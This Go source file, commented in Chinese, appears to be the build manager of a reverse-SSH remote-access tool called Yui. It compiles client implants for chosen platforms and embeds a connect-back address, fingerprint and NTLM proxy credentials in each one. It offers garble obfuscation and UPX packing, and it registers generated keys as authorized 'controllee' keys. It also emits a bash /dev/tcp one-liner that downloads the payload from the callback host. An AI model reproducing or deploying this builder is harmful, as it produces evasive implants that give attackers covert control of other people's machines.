package webserver

import (
	"bytes"         // 提供字节缓冲区操作
	"errors"        // 提供错误处理
	"fmt"           // 提供格式化输入输出
	"net"           // 提供网络相关功能
	"os"            // 提供操作系统相关功能
	"os/exec"       // 提供执行外部命令的功能
	"path/filepath" // 提供路径操作功能
	"runtime"       // 提供运行时信息
	"strconv"       // 提供字符串与数字的转换功能
	"strings"       // 提供字符串操作功能

	"github.com/QingYu-Su/Yui/internal"             // 内部模块
	"github.com/QingYu-Su/Yui/internal/server/data" // 内部服务器数据模块
	"github.com/QingYu-Su/Yui/pkg/logger"           // 日志模块
	"github.com/QingYu-Su/Yui/pkg/trie"             // 前缀树模块
	"golang.org/x/crypto/ssh"                       // 提供 SSH 加密功能
)

// Autocomplete 是一个全局的前缀树，用于自动补全功能
var (
	Autocomplete = trie.NewTrie()

	cachePath string // 缓存路径，所有文件均会保存在此处

	// 当前go支持编译的平台和架构
	validPlatforms = make(map[string]bool)
	validArchs     = make(map[string]bool)
)

// BuildConfig 定义了构建配置的结构体
type BuildConfig struct {
	Name, Comment, Owners string // 名称、注释、所有者

	GOOS, GOARCH, GOARM string // Go 构建目标的操作系统、架构、ARM 版本

	ConnectBackAdress, Fingerprint string // 反弹地址、指纹

	Proxy, SNI, LogLevel string // 代理、服务器名称指示、日志级别

	UseKerberosAuth bool // 是否使用 Kerberos 认证

	SharedLibrary bool // 是否使用共享库
	UPX           bool // 是否使用 UPX 压缩
	Lzma          bool // 是否使用 LZMA 压缩
	Garble        bool // 是否使用 Garble 混淆
	DisableLibC   bool // 是否禁用 libc
	RawDownload   bool // 是否使用原始下载
	UseHostHeader bool // 是否使用 Host 头部

	WorkingDirectory string // 工作目录

	NTLMProxyCreds string // NTLM 代理凭证
}

func Build(config BuildConfig) (string, error) {
	// 检查 Web 服务器是否启用
	if !webserverOn {
		return "", errors.New("web server is not enabled")
	}

	// 验证 GOARCH 是否有效
	if len(config.GOARCH) != 0 && !validArchs[config.GOARCH] {
		return "", fmt.Errorf("GOARCH supplied is not valid: " + config.GOARCH)
	}

	// 验证 GOOS 是否有效
	if len(config.GOOS) != 0 && !validPlatforms[config.GOOS] {
		return "", fmt.Errorf("GOOS supplied is not valid: " + config.GOOS)
	}

	// 如果未提供指纹，则使用默认指纹
	if len(config.Fingerprint) == 0 {
		config.Fingerprint = defaultFingerPrint
	}

	// 检查是否启用了 UPX 压缩，并验证 UPX 是否存在于系统的PATH中（即是否可执行upx命令）
	if config.UPX {
		_, err := exec.LookPath("upx")
		if err != nil {
			return "", errors.New("upx could not be found in PATH")
		}
	}

	// 默认使用 Go 构建工具
	buildTool := "go"
	// 如果启用了 Garble 混淆，验证 Garble 是否存在于 PATH 中
	if config.Garble {
		_, err := exec.LookPath("garble")
		if err != nil {
			return "", errors.New("garble could not be found in PATH")
		}
		buildTool = "garble"
	}

	// 初始化下载对象
	var f data.Download
	f.WorkingDirectory = config.WorkingDirectory
	f.CallbackAddress = config.ConnectBackAdress
	f.UseHostHeader = config.UseHostHeader

	// 固定生成随机文件名
	filename, err := internal.RandomString(16)
	if err != nil {
		return "", err
	}

	// 如果未提供名称，则生成随机名称，该名称会作为url和客户端所下载的文件名
	if len(config.Name) == 0 {
		config.Name, err = internal.RandomString(16)
		if err != nil {
			return "", err
		}
	}

	// 设置目标操作系统和架构
	// 如果未指定，则默认使用服务器的操作系统和架构
	f.Goos = runtime.GOOS
	if len(config.GOOS) > 0 {
		f.Goos = config.GOOS
	}

	f.Goarch = runtime.GOARCH
	if len(config.GOARCH) > 0 {
		f.Goarch = config.GOARCH
	}

	f.Goarm = config.GOARM

	// 设置文件路径和类型
	f.FilePath = filepath.Join(cachePath, filename)
	f.FileType = "executable"
	f.Version = internal.Version + "_guess"

	// 尝试获取 Git 仓库的版本信息
	repoVersion, err := exec.Command("git", "describe", "--tags").CombinedOutput()
	if err == nil {
		f.Version = string(repoVersion)
	}

	// 构建参数初始化
	var buildArguments []string
	if config.Garble {
		// 如果启用了 Garble，添加相关参数
		// -tiny：启用最小化混淆模式（减少输出体积）
		// -literals：混淆字符串字面量（如硬编码的字符串）
		buildArguments = append(buildArguments, "-tiny", "-literals")
	}

	// 添加构建参数
	// build​​：告诉 Go 工具链执行构建操作
	// -trimpath​​：移除文件路径中的绝对路径信息（避免泄露本地目录结构）
	buildArguments = append(buildArguments, "build", "-trimpath")

	// 如果启用了共享库模式，添加相关参数，指定构建模式为C兼容的共享库
	if config.SharedLibrary {
		buildArguments = append(buildArguments, "-buildmode=c-shared")
		buildArguments = append(buildArguments, "-tags=cshared")
		f.FileType = "shared-object"
		if f.Goos != "windows" {
			f.FilePath += ".so"
		} else {
			f.FilePath += ".dll"
		}
	}

	// 生成新的私钥
	newPrivateKey, err := internal.GeneratePrivateKey()
	if err != nil {
		return "", err
	}

	// 解析私钥
	sshPriv, err := ssh.ParsePrivateKey(newPrivateKey)
	if err != nil {
		return "", err
	}

	// 将私钥写入文件
	err = os.WriteFile(filepath.Join(projectRoot, "internal/client/keys/private_key"), newPrivateKey, 0600)
	if err != nil {
		return "", err
	}

	// 将公钥写入文件
	publicKeyBytes := ssh.MarshalAuthorizedKey(sshPriv.PublicKey())
	err = os.WriteFile(filepath.Join(projectRoot, "internal/client/keys/private_key.pub"), publicKeyBytes, 0600)
	if err != nil {
		return "", err
	}

	// 验证日志级别是否有效
	_, err = logger.StrToUrgency(config.LogLevel)
	if err != nil {
		return "", err
	}

	// 添加构建时的链接参数
	// -ldflags用于传递给链接器的标志，-s表示禁用符号表，-w表示禁用 DWARF 调试信息两者都用于减少生成的可执行文件大小
	// -X 用于在编译时注入变量值，这里注入了main.logLevel、main.destination、main.fingerprint、main.proxy、main.customSNI、main.useKerberosStr、main.ntlmProxyCreds、github.com/QingYu-Su/Yui/internal.Version
	buildArguments = append(buildArguments, fmt.Sprintf("-ldflags=-s -w -X main.logLevel=%s -X main.destination=%s -X main.fingerprint=%s -X main.proxy=%s -X main.customSNI=%s -X main.useKerberosStr=%t -X main.ntlmProxyCreds=%s -X github.com/QingYu-Su/Yui/internal.Version=%s", config.LogLevel, config.ConnectBackAdress, config.Fingerprint, config.Proxy, config.SNI, config.UseKerberosAuth, config.NTLMProxyCreds, strings.TrimSpace(f.Version)))

	// 指定输出文件名和需要编译的Go代码文件（生成客户端），注意这里的文件名是随机的，且生成的地址为cachePath的路径下
	buildArguments = append(buildArguments, "-o", f.FilePath, filepath.Join(projectRoot, "/cmd/client"))

	// 创建构建命令
	cmd := exec.Command(buildTool, buildArguments...)

	// 如果禁用了 libc，设置环境变量 CGO_ENABLED=0，表示是否禁用 CGO（即禁止 Go 调用 C 代码）
	if config.DisableLibC {
		cmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	}

	// 设置构建环境变量
	cmd.Env = append(cmd.Env, os.Environ()...)    //获取当前进程的所有环境变量
	cmd.Env = append(cmd.Env, "GOOS="+f.Goos)     //设置目标操作系统
	cmd.Env = append(cmd.Env, "GOARCH="+f.Goarch) //设置目标架构
	if len(f.Goarm) != 0 {
		cmd.Env = append(cmd.Env, "GOARM="+f.Goarm)
	}

	// 如果启用了共享库模式，且需要构建Windows的程序，则需要设置C语言为交叉编译器
	cgoOn := "0"
	if config.SharedLibrary {
		var crossCompiler string
		if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && f.Goos == "windows" {
			crossCompiler = "x86_64-w64-mingw32-gcc"
			if f.Goarch == "386" {
				crossCompiler = "i686-w64-mingw32-gcc"
			}
		}
		cmd.Env = append(cmd.Env, "CC="+crossCompiler)
		cgoOn = "1"
	}

	cmd.Env = append(cmd.Env, "CGO_ENABLED="+cgoOn)

	// 执行构建命令
	output, err := cmd.CombinedOutput()
	if err != nil {
		// 如果构建失败，尝试清理缓存并重试
		if strings.Contains(err.Error(), "garble") && (strings.Contains(err.Error(), "i686-w64-mingw32-ld") || strings.Contains(err.Error(), "x86_64-w64-mingw32-ld")) &&
			strings.Contains(err.Error(), "undefined reference to") {
			if cleanErr := exec.Command("go", "clean", "-cache").Run(); cleanErr != nil {
				return "", fmt.Errorf("Error (was unable to automatically clean cache): " + err.Error() + "\n" + string(output))
			}
			output, err = cmd.CombinedOutput()
			if err != nil {
				return "", fmt.Errorf("Error: " + err.Error() + "\n" + string(output))
			}
		} else {
			return "", fmt.Errorf("Error: " + err.Error() + "\n" + string(output))
		}
	}

	// 设置文件的 URL 路径（这里不使用文件名，而是配置名作为url的路径，因为文件名是随机的）
	f.UrlPath = config.Name

	// 如果启用了 LZMA 压缩但未启用 UPX，返回错误
	if config.Lzma && !config.UPX {
		return "", errors.New("Cannot use --lzma without --upx")
	}

	// 如果启用了 UPX 压缩，执行 UPX 命令
	// -qq：静默模式（减少 UPX 的输出日志）
	// -f： 强制覆盖输出文件（如果已存在）。
	// --lzma：使用 LZMA 算法替代默认压缩算法（压缩率更高，但速度更慢）。
	if config.UPX {
		upxArgs := []string{"-qq", "-f", f.FilePath}
		if config.Lzma {
			upxArgs = append([]string{"--lzma"}, upxArgs...)
		}
		output, err := exec.Command("upx", upxArgs...).CombinedOutput()
		if err != nil {
			return "", errors.New("unable to run upx: " + err.Error() + ": " + string(output))
		}
	}

	// 获取文件大小并设置权限
	fi, err := os.Stat(f.FilePath)
	if err != nil {
		fmt.Println("Error: ", err)
	}
	f.FileSize = float64(fi.Size()) / 1024 / 1024
	os.Chmod(f.FilePath, 0600)

	// 设置日志级别
	f.LogLevel = config.LogLevel

	// 创建下载记录到数据库中
	err = data.CreateDownload(f)
	if err != nil {
		return "", err
	}

	// 将配置名称添加到自动补全中
	Autocomplete.Add(config.Name)

	// 向一个授权密钥文件（authorized_controllee_keys）追加写入新的公钥信息​​
	authorizedControlleeKeys, err := os.OpenFile(filepath.Join(cachePath, "../authorized_controllee_keys"), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return "", errors.New("cant open authorized controllee keys file: " + err.Error())
	}
	defer authorizedControlleeKeys.Close()

	if _, err = authorizedControlleeKeys.WriteString(fmt.Sprintf("%s %s %s\n", "owner="+strconv.Quote(config.Owners), publicKeyBytes[:len(publicKeyBytes)-1], config.Comment)); err != nil {
		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
	}

	// 如果启用了原始下载模式，返回 Bash 命令
	if config.RawDownload {
		host, port, err := net.SplitHostPort(f.CallbackAddress)
		if err != nil {
			// 打开 TCP 连接，绑定到描述符 3（可读写）
			// 通过（Bash 内置的 TCP 连接功能）/dev/tcp向 TCP 连接发送数据（写入到描述符 3，012都是标准文件描述符，只能从3开始）
			// 通过cat将文件描述符 3 的内容作为输入（类似从文件读取）
			// 将内容写入到本地文件中
			return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/HOSTHERE/PORT_HERE; echo RAW%[1]s>&3; cat <&3" > %[1]s`, config.Name), nil
		}
		return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/%s/%s; echo RAW%[3]s>&3; cat <&3" > %[3]s`, host, port, config.Name), nil
	}

	// 返回 HTTP 下载链接
	return "http://" + DefaultConnectBack + "/" + config.Name, nil
}

// startBuildManager 初始化构建管理器，设置缓存路径并获取支持的平台和架构
func startBuildManager(_cachePath string) error {
	// 检查客户端源代码目录是否存在
	clientSource := filepath.Join(projectRoot, "/cmd/client")
	info, err := os.Stat(clientSource)
	if err != nil || !info.IsDir() {
		// 如果目录不存在或不是目录，返回错误
		return fmt.Errorf("the server doesn't appear to be in {project_root}/bin, please put it there")
	}

	// 获取 Go 编译器支持的编译目标列表
	cmd := exec.Command("go", "tool", "dist", "list")
	output, err := cmd.CombinedOutput()
	if err != nil {
		// 如果无法运行 Go 编译器，返回错误
		return fmt.Errorf("unable to run the go compiler to get a list of compilation targets: %s", err)
	}

	// 将输出按行分割，每行表示一个编译目标（平台/架构），本质上就是当前 Go 版本支持的 ​​所有有效的 GOOS/GOARCH 组合
	platformAndArch := bytes.Split(output, []byte("\n"))

	// 遍历编译目标列表，提取平台和架构
	for _, line := range platformAndArch {
		parts := bytes.Split(line, []byte("/"))
		if len(parts) == 2 {
			// 将平台和架构添加到有效列表中
			validPlatforms[string(parts[0])] = true
			validArchs[string(parts[1])] = true
		}
	}

	// 检查缓存路径是否存在
	info, err = os.Stat(_cachePath)
	if os.IsNotExist(err) {
		// 如果缓存路径不存在，则创建目录
		err = os.Mkdir(_cachePath, 0700)
		if err != nil {
			// 如果创建失败，返回错误
			return err
		}
		// 再次检查缓存路径的状态
		info, err = os.Stat(_cachePath)
		if err != nil {
			return err
		}
	}

	// 如果缓存路径存在但不是目录，返回错误
	if !info.IsDir() {
		return errors.New("Filestore path '" + _cachePath + "' already exists, but is a file instead of directory")
	}

	// 设置全局缓存路径变量
	cachePath = _cachePath

	// 初始化成功，返回 nil
	return nil
}
